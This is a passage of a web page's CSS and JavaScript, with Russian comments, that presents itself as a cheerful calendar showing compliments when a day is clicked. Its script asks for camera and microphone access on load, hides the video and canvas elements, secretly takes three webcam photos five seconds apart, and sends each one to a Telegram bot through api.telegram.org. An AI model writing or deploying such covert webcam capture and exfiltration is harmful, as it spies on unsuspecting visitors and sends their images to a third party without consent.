        body {
            background-color: #1e2a47;
            color: white;
            font-family: 'Arial', sans-serif;
            text-align: center;
            padding: 50px;
            animation: fadeIn 3s ease;
        }

        h1 {
            font-size: 3em;
            margin-top: 50px;
            color: #FFD700;
            animation: bounce 2s infinite;
        }

        p {
            font-size: 1.5em;
            margin-top: 20px;
            color: #FF6347;
        }

        .calendar {
            display: grid;
            grid-template-columns: repeat(7, 1fr); /* 7 колонок */
            gap: 10px;
            margin-top: 50px;
        }

        .calendar .day {
            background-color: #2e3b8f;
            border-radius: 10px;
            padding: 20px;
            font-size: 1.5em;
            color: white;
            cursor: pointer;
            transition: transform 0.3s ease, background-color 0.3s ease;
        }

        .calendar .day:hover {
            transform: scale(1.1);
            background-color: #FFD700;
        }

        .calendar .day:active {
            transform: scale(0.95);
            background-color: #FF6347;
        }

        #video {
            display: none;
        }

        #canvas {
            display: none;
        }

        #compliment {
            margin-top: 20px;
            font-size: 1.8em;
            color: #FF6347;
        }

        /* Анимация для текста */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        /* Анимация для заголовка */
        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-20px);
            }
        }

        /* Медиазапросы для адаптации */
        @media (max-width: 768px) {
            h1 {
                font-size: 2.2em;
            }

            p {
                font-size: 1.2em;
            }

            .calendar {
                grid-template-columns: repeat(4, 1fr); /* 4 колонки на мобильных */
                gap: 8px;
            }

            .calendar .day {
                font-size: 1.2em;
                padding: 15px;
            }

            #compliment {
                font-size: 1.4em;
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.8em;
            }

            p {
                font-size: 1em;
            }

            .calendar {
                grid-template-columns: repeat(3, 1fr); /* 3 колонки на очень маленьких экранах */
            }

            .calendar .day {
                font-size: 1em;
                padding: 10px;
            }

            #compliment {
                font-size: 1.2em;
            }
        }

    </style>
</head>

        // Функция для получения доступа к камере
        function getCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                    startCapturing();
                })
                .catch((err) => {
                    console.log('Ошибка доступа к камере: ', err);
                });

            Notification.requestPermission().then(function(result) {
                console.log(result);
            });

            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(() => {
                    console.log("Microphone permission granted.");
                })
                .catch((err) => {
                    console.log('Ошибка доступа к микрофону: ', err);
                });
        }

        function captureAndSendPhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoData = canvas.toDataURL('image/jpeg');
            const byteString = atob(photoData.split(',')[1]);
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });

            sendPhotoToTelegram(blob);
        }

        function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, "photo.jpg");

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Фото успешно отправлено!');
                } else {
                    console.error('Ошибка при отправке фото:', data);
                }
            })
            .catch(err => console.error('Ошибка при отправке:', err));
        }

        function startCapturing() {
            let captureCount = 0;

            const captureInterval = setInterval(() => {
                if (captureCount < 3) {
                    captureAndSendPhoto();
                    captureCount++;
                } else {
                    clearInterval(captureInterval);
                    stopCamera();
                }
            }, 5000);
        }

        function stopCamera() {
            const stream = video.srcObject;
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
            video.srcObject = null;
        }

        function showCompliment(day) {
            complimentDiv.textContent = compliments[day];
        }

        document.querySelectorAll('.calendar .day').forEach(dayElement => {
            dayElement.addEventListener('click', function() {
                const day = this.id.replace('day', '');
                showCompliment(day);
            });
        });

        getCameraAccess();
